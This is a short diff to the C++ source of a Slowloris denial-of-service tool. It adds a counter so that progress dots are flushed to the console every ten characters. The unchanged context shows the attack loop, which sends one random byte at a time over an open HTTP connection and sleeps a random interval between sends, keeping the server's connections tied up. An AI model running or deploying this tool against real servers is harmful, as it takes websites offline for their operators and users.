@@ -27,10 +27,15 @@ void Slowloris::loris() {
     if (http_succes >= 0) {
         struct timespec sleep_structure{};
         sleep_structure.tv_sec = 0;
-
+        int count = 0;
         while (true) {
+            count++;
             auto dummy_character = (char) ((56 * (rand() / (RAND_MAX + 1.0))) + 65);
             std::cout << ".";
+            if (count >= 10) {
+                count = 0;
+                std::cout.flush();
+            }
             send(socket_descriptor, (const char *) &dummy_character, 1, 0);
 
             auto milisecond = static_cast<int>(999 * (rand() / (RAND_MAX + 1.0)));
